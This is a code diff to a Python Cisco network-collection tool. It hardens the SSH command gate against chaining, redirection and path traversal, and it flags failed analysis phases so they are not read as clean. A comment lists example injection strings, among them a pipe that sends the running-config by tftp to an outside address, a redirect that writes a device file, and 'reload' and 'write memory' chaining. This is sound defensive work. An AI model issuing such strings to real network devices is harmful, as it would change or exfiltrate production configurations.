@@ -742,10 +742,46 @@ COMMANDS_ALL = list(dict.fromkeys(COMMANDS_NXOS + COMMANDS_IOS))
 TERMINAL_SETUP_CMDS = ("terminal length 0", "terminal width 511")   # the ONLY non-`show` wire strings
 _SSH_WIRE_CMD = re.compile(r"^show\s+\S")
 
+# The `^show` prefix above only constrains the FIRST WORD. Everything after it was unchecked, so the
+# gate admitted strings that START with a read verb and go on to MUTATE the device or egress from it --
+# the exact outcomes guardrail 1 forbids, waved through by the guard that exists to forbid them:
+#   'show running-config | redirect bootflash:pwn.txt'  -> NX-OS WRITES that file on the device
+#   'show running-config | tftp://10.0.0.9/pwn.txt'     -> ships the running-config OFF the device
+#   a read verb followed by an embedded NEWLINE and a config-mode line -> netmiko writes the string to
+#       the channel verbatim, so every embedded line is typed at the exec prompt, on production gear
+#   'show version ; reload' / 'show version && write memory'
+# No registry entry does any of this today (the union of characters across all 100 wire-eligible
+# commands is letters/digits/space/'-'/'^'/'|', and the single pipe is the read filter
+# `show running-config | section ^interface`), so this is a latent hole, not a live defect. It matters
+# anyway because the whole POINT of the positive grammar, per the block above, is that a registry entry
+# added LATER is excluded BY DEFAULT instead of having to be remembered -- and a write tacked onto a
+# read verb is both the most dangerous such entry and the one the prefix check cannot see. It is also
+# what `cisco_toolkit.attestation`'s published `read_only_command_surface` claim rests on.
+#
+# So the check is now WHOLE-STRING: no chaining/redirection/substitution metacharacter anywhere, and a
+# pipe may only introduce an output FILTER (an allowlist), never a redirect/tee/append/URL sink.
+# A BACKSLASH is in the set for a second reason: collect() derives each capture's FILENAME from the
+# command (`cmd.replace(" ","_").replace("|","_").replace("^","").replace("/","_")`). That sanitises the
+# POSIX separator but not the Windows one, and the path is then fed to os.makedirs(os.path.dirname(p)) --
+# so a backslash-bearing command would write its capture outside the collection directory, creating the
+# traversal path on the way. Excluding it here fixes both surfaces at the one gate.
+_WIRE_FORBIDDEN = re.compile(r"[\r\n;&`$><\\]")
+_WIRE_PIPE_FILTER_OK = re.compile(
+    r"^(section|include|exclude|begin|grep|egrep|count|json|xml|no-more|last|head|diff|sort|uniq|in)\b")
+
 
 def is_ssh_wire_command(cmd) -> bool:
-    """True when `cmd` is a device-CLI read this collector may type at an SSH exec prompt."""
-    return bool(_SSH_WIRE_CMD.match(str(cmd).strip()))
+    """True when `cmd` is a device-CLI read this collector may type at an SSH exec prompt.
+
+    A read VERB is necessary but not sufficient: the whole string must carry no way to chain,
+    redirect or substitute another command (see the block above)."""
+    s = str(cmd).strip()
+    if not _SSH_WIRE_CMD.match(s):
+        return False
+    if _WIRE_FORBIDDEN.search(s):
+        return False
+    # every pipe stage must be a read-only output filter
+    return all(_WIRE_PIPE_FILTER_OK.match(seg.strip()) for seg in s.split("|")[1:])
 
 
 def ssh_wire_commands(cmds) -> List[str]:
@@ -778,10 +814,15 @@ def _attach_package_logging(fh, ch, level):
        ("PHASE 2.7 step 21") moved the sheet writers to ``cisco_toolkit.excel`` — the same commit
        that removed them from the log. Attaching here RESTORES that output rather than inventing it.
 
-    Volume, MEASURED rather than assumed: 132 call sites (93 info / 22 warning / 12 error / 5 debug).
+    Volume, MEASURED rather than assumed: at the 2026-07-28 review, ~150 call sites across the package
+    (the split was ~95 info / ~32 warning / ~17 error / 5 debug). Treat those as a SHAPE, not a pin --
+    an exact count was recorded here once ("132 / 93 / 22 / 12 / 5") and had drifted on every figure but
+    `debug` by this review, because a bare number in a docstring has no owner and no reconcile guard
+    (SSOT Law 1). Re-measure with an AST walk over ``cisco_toolkit/`` rather than trusting this line.
     The floor is ~80 records a run and CONSTANT — mostly excel's one line per sheet written. Two sites
-    in ``cisco_toolkit.build`` are per-device but CONDITIONAL: build.py:993 fires only when the device
-    returned ARP entries (``if device_total > 0``) and build.py:1091 only when the config carries
+    in ``cisco_toolkit.build`` are per-device but CONDITIONAL: the per-device ARP line in
+    ``collect_global_arp`` fires only when the device returned ARP entries (``if device_total > 0``) and
+    the ``[STP]`` line in ``build_interfaces`` only when the config carries
     ``spanning-tree portfast bpduguard default``. So on the synthetic fixtures neither fires and the
     count is flat 81 at 3, 30 and 60 devices; on a real ARP-bearing fleet it grows ~1/device, i.e.
     ~380 at the canonical 303. Either way this is a few hundred lines a run, none per-interface, and
@@ -817,7 +858,9 @@ def setup_logging(level=logging.INFO):
     logger = logging.getLogger("CiscoMigrationAutofillV3_14_6")
     logger.setLevel(level)
     # REUSE an already-open handler for this log file instead of opening a second mode="w" one.
-    # `cisco_toolkit/attestation.py:122` does importlib.import_module("COLLECT_PARSE_V3_23_0"); under
+    # `cisco_toolkit.attestation :: _claim_read_only` does importlib.import_module(_COLLECTOR_MODULE),
+    # i.e. import_module("COLLECT_PARSE_V3_23_0") (cited by SYMBOL: the line number this named until the
+    # 2026-07-28 review, `attestation.py:122`, had rotted to an unrelated function); under
     # `python COLLECT_PARSE_V3_23_0.py` this module's identity is __main__, so that import RE-EXECUTES
     # the body -- including `logger = setup_logging()` at the bottom -- and a fresh mode="w" handler
     # TRUNCATED the log near the end of every script-path run, discarding most of what it had already
@@ -3096,6 +3139,25 @@ def main():
         logger.warning("  [INTEGRITY] architecture-review computation FAILED; stamping assessment_integrity so "
                        "consumers disclose 'architecture review unavailable' rather than a clean grade.")
         snap_dict.setdefault("assessment_integrity", {})["architecture_review"] = "compute_failed"
+    # ... and the same disclosure for EVERY other fail-soft phase (review 2026-07-28). The two stamps
+    # above cover 2 of the 41 fail-soft sections main() publishes into the snapshot; the other 39 fall
+    # back to `[]` / `{}` on a compute crash, which on disk is BYTE-IDENTICAL to "computed fine, found
+    # nothing". So a crashed `cross_layer` publishes no cross-layer criticals (and migration-readiness'
+    # cross-layer check then passes, grading a move group READY off evidence that never ran), a crashed
+    # `punchlist` publishes a clean punch-list, a crashed `operational_drift` publishes no drift, a
+    # crashed `software_risk` publishes no advisory exposure. That is "not observed" silently becoming
+    # "healthy" — the false-health class guardrail 3 forbids, at assembly level rather than device level.
+    # The `_unavailable` sentinel can't be pushed down into the other 39 defaults without changing the
+    # shape every consumer indexes, so disclose ALONGSIDE instead: _run_phase already records ok=False
+    # per phase, so publish that list and let consumers tell a crash from a clean result.
+    # Golden-neutral by construction: a clean run has no failed phase, so the key is never written.
+    _failed_phases = list(dict.fromkeys(p["phase"] for p in _PHASE_TIMINGS if not p.get("ok", True)))
+    if _failed_phases:
+        logger.warning(f"  [INTEGRITY] {len(_failed_phases)} analysis phase(s) FAILED and fell back to an "
+                       f"empty result that is indistinguishable from a clean one; stamping "
+                       f"assessment_integrity.failed_phases so consumers do not read them as healthy: "
+                       f"{_failed_phases}")
+        snap_dict.setdefault("assessment_integrity", {})["failed_phases"] = _failed_phases
     snap_dict["device_dossiers"] = device_dossiers                   # NEW-V3.23.172 (per-asset compound-risk register; reused from the Phase 30d synthesis)
     # NEW-V3.23.160: the senior-engineer design review. V3.23.161: REUSES the object computed in
     # Phase 30f for the workbook sheet (one source of truth — sheet, snapshot and DOCX agree),
